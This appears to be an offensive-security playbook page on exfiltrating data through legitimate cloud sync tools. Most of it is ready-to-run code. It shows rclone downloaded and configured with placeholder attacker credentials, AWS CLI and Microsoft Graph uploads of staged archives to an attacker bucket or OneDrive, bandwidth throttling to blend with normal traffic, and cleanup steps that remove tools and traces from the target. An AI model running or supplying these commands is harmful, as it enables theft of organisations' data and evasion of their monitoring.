# Cloud sync exfiltration

Exfiltrating data using legitimate cloud sync tools and storage APIs.
These tools are typically whitelisted by corporate firewalls and generate
traffic that is indistinguishable from normal business activity.

## Prerequisites

- Attacker-controlled account on a supported cloud provider
  (AWS S3, Google Drive, OneDrive, Dropbox, Backblaze, etc.)
- Rclone or the provider's native CLI installed or deployable on the target
- Outbound HTTPS permitted (universal in enterprise environments)

## Rclone: the most versatile option

Rclone supports 40+ cloud providers with a single binary. Download it
without installation:

```powershell
# Windows: download rclone without running an installer
Invoke-WebRequest -Uri 'https://downloads.rclone.org/rclone-current-windows-amd64.zip' `
  -OutFile C:\Temp\rclone.zip
Expand-Archive C:\Temp\rclone.zip C:\Temp\rclone\
$rclone = (Get-ChildItem C:\Temp\rclone\ -Recurse -Filter rclone.exe).FullName
```

```bash
# Linux: single binary
curl -O https://downloads.rclone.org/rclone-current-linux-amd64.zip
unzip rclone-current-linux-amd64.zip
RCLONE=./rclone-*/rclone
```

Configure non-interactively to avoid prompts:

```bash
# create rclone config file directly (no interactive prompts)
mkdir -p ~/.config/rclone
cat > ~/.config/rclone/rclone.conf << 'EOF'
[exfil]
type = s3
provider = AWS
access_key_id = ATTACKER_KEY
secret_access_key = ATTACKER_SECRET
region = eu-west-1
EOF

# or use environment variables instead of a config file (leaves no file on disk)
export RCLONE_CONFIG_EXFIL_TYPE=s3
export RCLONE_CONFIG_EXFIL_PROVIDER=AWS
export RCLONE_CONFIG_EXFIL_ACCESS_KEY_ID=ATTACKER_KEY
export RCLONE_CONFIG_EXFIL_SECRET_ACCESS_KEY=ATTACKER_SECRET
export RCLONE_CONFIG_EXFIL_REGION=eu-west-1
```

Sync staged data:

```bash
# copy a single archive
./rclone copyto /tmp/staged.zip exfil:attacker-bucket/$(hostname)-$(date +%s).zip \
  --quiet --no-check-dest

# copy a directory
./rclone copy /tmp/collected/ exfil:attacker-bucket/out/ --quiet --no-check-dest

# bandwidth throttle to blend with normal traffic
./rclone copy /tmp/staged.zip exfil:attacker-bucket/ --bwlimit 500k --quiet
```

## AWS CLI exfiltration

```bash
# configure attacker profile without touching the default profile
mkdir -p /tmp/.aws
cat > /tmp/.aws/credentials << 'EOF'
[exfil]
aws_access_key_id = ATTACKER_KEY
aws_secret_access_key = ATTACKER_SECRET
EOF

AWS_SHARED_CREDENTIALS_FILE=/tmp/.aws/credentials \
  aws s3 cp /tmp/staged.zip s3://attacker-bucket/ --profile exfil --quiet

# clean up
rm -rf /tmp/.aws
```

## Microsoft Graph: upload to attacker-controlled OneDrive

Requires the attacker to have a Microsoft account or Azure AD tenant with
a OneDrive allocation:

```python
import requests, os

# get an access token for the attacker's OneDrive
# (using device code flow or pre-obtained token from attacker infrastructure)
headers = {
    'Authorization': f'Bearer {ATTACKER_ONEDRIVE_TOKEN}',
    'Content-Type': 'application/octet-stream'
}

with open('/tmp/staged.zip', 'rb') as f:
    data = f.read()

r = requests.put(
    'https://graph.microsoft.com/v1.0/me/drive/root:/exfil/staged.zip:/content',
    headers=headers,
    data=data)
print(r.status_code, r.json().get('id'))
```

For large files, use the resumable upload session:

```python
# create upload session for files > 4MB
session = requests.post(
    'https://graph.microsoft.com/v1.0/me/drive/root:/exfil/large.zip:/createUploadSession',
    headers={'Authorization': f'Bearer {ATTACKER_ONEDRIVE_TOKEN}',
             'Content-Type': 'application/json'},
    json={'item': {'@microsoft.graph.conflictBehavior': 'replace'}}).json()

upload_url = session['uploadUrl']
chunk_size = 320 * 1024  # 320KB per chunk (OneDrive requirement)
file_size  = os.path.getsize('/tmp/staged.zip')

with open('/tmp/staged.zip', 'rb') as f:
    offset = 0
    while True:
        chunk = f.read(chunk_size)
        if not chunk:
            break
        headers = {
            'Content-Length': str(len(chunk)),
            'Content-Range': f'bytes {offset}-{offset+len(chunk)-1}/{file_size}'
        }
        requests.put(upload_url, headers=headers, data=chunk)
        offset += len(chunk)
```

## Verify receipt

```bash
# confirm the file arrived on attacker infrastructure
AWS_ACCESS_KEY_ID=ATTACKER_KEY AWS_SECRET_ACCESS_KEY=ATTACKER_SECRET \
  aws s3 ls s3://attacker-bucket/

# verify integrity
aws s3 cp s3://attacker-bucket/staged.zip /tmp/received.zip
md5sum /tmp/staged.zip /tmp/received.zip  # should match
```

## Clean up

```bash
# remove the tool and config from the target
rm -f rclone rclone-current-linux-amd64.zip
rm -f ~/.config/rclone/rclone.conf  # or rm -rf ~/.config/rclone/
# clear environment variables (already gone after shell exit)

# remove staged data from the target
rm -rf /tmp/staged.zip /tmp/collected/
```
